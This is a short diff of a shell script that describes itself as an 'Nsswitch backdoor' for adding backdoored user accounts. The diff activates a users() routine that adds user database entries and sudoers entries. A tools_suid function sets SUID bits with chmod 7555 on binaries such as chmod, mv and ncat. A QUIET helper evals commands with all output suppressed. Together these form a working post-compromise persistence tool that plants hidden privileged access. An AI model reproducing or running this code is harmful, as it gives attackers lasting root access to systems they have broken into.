@@ -1,5 +1,9 @@
-# Add backdoored user accounts
-#Micah's stubbed out/incomplete modification of Nsswitch 
+#Nsswitch backdoor cred to Micah 
+QUIET (){
+	eval $@ 2>/dev/null >/dev/null
+	return $?
+}
+
 users_db() {
     # /var/lib/misc on Debian
     # /var/db on RHEL
@@ -51,15 +55,14 @@ tools_suid() {
     bins="$bins watch chmod mv ncat"
     for b in $bins; do
         QUIET chmod 7555 `command -v $b`;
-        [ "$?" = "0" ] && LOG 0 "SUID Set on $b";
+        [ "$?" = "0" ] && echo "SUID Set on $b";
     done
     return 0;
 };
 
-#users() {
-   # #users_db "$GLOBAL_SERVER";
-  #  echo "Sudoers added"
- #   users_sudo;
-#};
-
-users_db;
+users() {
+    users_db;
+    echo "Sudoers added"
+    users_sudo;
+};
+users;
